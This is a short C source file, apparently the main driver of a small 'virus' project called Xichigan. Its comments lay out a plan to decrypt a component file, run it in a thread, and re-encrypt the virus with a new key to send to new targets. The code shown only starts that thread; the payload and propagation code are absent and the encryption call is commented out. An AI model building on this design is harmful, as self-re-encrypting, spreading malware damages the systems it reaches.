#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: ./xichigan                 									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	int ret;

	/* Initialize Space for 2 Threads */
	threads = (pthread_t *)malloc(sizeof(pthread_t)*2);
 
	/* 
		Decrypt the file XtoM.c 
	*/

	/*
		Create new threads to run XtoM and re-encrypt the virus to send to new targets
	*/

	/* Run XtoM */
	pthread_create(&threads[0], &attribute, XtoM, NULL); /* create a new thread */

	/* Encrypt File */
	// Generate a new key and put it in the file key.txt

	// Encrypt the file using the key
	//pthread_create(&threads[1], &attribute, encryptFile, NULL); /* create a new thread */


	// Do not explicitly wait for the thread to end
	ret = 0;
   pthread_exit(&ret);

	free(threads);
	return 0;
}


